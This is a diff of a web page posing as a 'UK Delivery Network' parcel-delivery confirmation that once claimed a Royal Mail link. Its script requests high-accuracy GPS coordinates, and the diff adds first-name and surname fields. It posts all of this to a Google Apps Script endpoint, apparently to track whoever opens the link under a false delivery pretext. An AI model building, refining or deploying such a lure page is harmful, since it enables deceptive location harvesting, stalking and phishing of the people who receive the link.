@@ -11,33 +11,33 @@
 body {
   font-family: Arial, Helvetica, sans-serif;
   background: linear-gradient(135deg, #0b1f3a, #163d6b);
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0;
 }
 
 .card {
-  background: white;
-  width: 90%;
-  max-width: 420px;
-  padding: 40px 30px;
-  border-radius: 18px;
-  text-align: center;
-  box-shadow: 0 15px 40px rgba(0,0,0,0.25);
+  background:white;
+  width:90%;
+  max-width:420px;
+  padding:40px 30px;
+  border-radius:18px;
+  text-align:center;
+  box-shadow:0 15px 40px rgba(0,0,0,0.25);
 }
 
 .logo img {
-  width: 150px;
-  max-width: 80%;
-  margin-bottom: 15px;
+  width:150px;
+  max-width:80%;
+  margin-bottom:15px;
 }
 
 .logo {
-  font-size: 28px;
-  font-weight: bold;
-  color: #0b1f3a;
+  font-size:28px;
+  font-weight:bold;
+  color:#0b1f3a;
 }
 
 .tagline {
@@ -54,7 +54,28 @@ p {
   line-height:1.6;
 }
 
+label {
+  display:block;
+  text-align:left;
+  color:#555;
+  margin-top:12px;
+}
+
+input {
+
+  width:100%;
+  padding:12px;
+  margin-top:6px;
+  border:1px solid #ccc;
+  border-radius:8px;
+  box-sizing:border-box;
+  font-size:16px;
+
+}
+
+
 button {
+
   background:#c9a227;
   color:white;
   border:none;
@@ -63,24 +84,35 @@ button {
   font-size:17px;
   font-weight:bold;
   cursor:pointer;
-  margin-top:20px;
+  margin-top:25px;
+
 }
+
 
 button:hover {
+
   background:#b08b1e;
+
 }
 
+
 #status {
+
   margin-top:20px;
   color:#0b1f3a;
   font-weight:bold;
+
 }
 
+
 .footer {
+
   margin-top:25px;
   font-size:12px;
   color:#888;
+
 }
+
 
 </style>
 
@@ -107,31 +139,55 @@ UK Delivery Network
 
 
 <div class="tagline">
-Fast • Reliable • Professional Delivery in association with Royal Mail
+Fast • Reliable • Professional Delivery
 </div>
 
 
 
 <h2>
-Confirm your prefered delivery location
+Confirm your delivery location
 </h2>
 
 
 
 <p>
-To help us ensure your delivery arrives smoothly your driver James would like to confirm some details
+To help complete your delivery, please confirm your details below.
 </p>
 
 
 
+<label>
+First Name (Optional)
+</label>
+
+<input 
+type="text"
+id="firstName"
+placeholder="Enter first name">
+
+
+
+<label>
+Surname (Optional)
+</label>
+
+<input 
+type="text"
+id="surname"
+placeholder="Enter surname">
+
+
+
 <p>
-Your device will ask for permission. This infomation is only used to complete this delivery.
+Your device will ask for permission to share your location.
 </p>
 
 
 
 <button onclick="getLocation()">
-📍 Show Delivery Location Form
+
+📍 Share Delivery Location
+
 </button>
 
 
@@ -141,33 +197,56 @@ Your device will ask for permission. This infomation is only used to complete th
 
 
 <div class="footer">
-UK Delivery Network © 2022
+
+UK Delivery Network © 2026
+
 </div>
 
 
 </div>
+
 
 
 
 <script>
 
+
 function getLocation(){
 
-const status = document.getElementById("status");
+
+const status =
+document.getElementById("status");
+
+
+
+const firstName =
+document.getElementById("firstName").value;
+
+
+
+const surname =
+document.getElementById("surname").value;
+
+
 
 
 if(!navigator.geolocation){
+
 
 status.innerHTML =
 "Location is not supported on this device.";
 
 return;
 
+
 }
+
+
 
 
 status.innerHTML =
 "Getting accurate location...";
+
 
 
 
@@ -177,23 +256,33 @@ navigator.geolocation.getCurrentPosition(
 function(position){
 
 
+
 const data = {
 
 
-latitude: position.coords.latitude,
+firstName:firstName,
 
 
-longitude: position.coords.longitude,
+surname:surname,
 
 
-accuracy: Math.round(position.coords.accuracy)
+latitude:position.coords.latitude,
+
+
+longitude:position.coords.longitude,
+
+
+accuracy:Math.round(
+position.coords.accuracy
+)
 
 
 };
 
 
 
-console.log("GPS Data:", data);
+
+console.log(data);
 
 
 
@@ -202,8 +291,11 @@ status.innerHTML =
 
 
 
+
 fetch(
+
 "https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
+
 {
 
 
@@ -242,9 +334,6 @@ return response.text();
 .then(function(result){
 
 
-console.log(result);
-
-
 status.innerHTML =
 "✓ Location received. Thank you.";
 
@@ -264,6 +353,7 @@ status.innerHTML =
 
 
 });
+
 
 
 },
@@ -286,9 +376,7 @@ status.innerHTML =
 
 enableHighAccuracy:true,
 
-
 timeout:30000,
-
 
 maximumAge:0
 
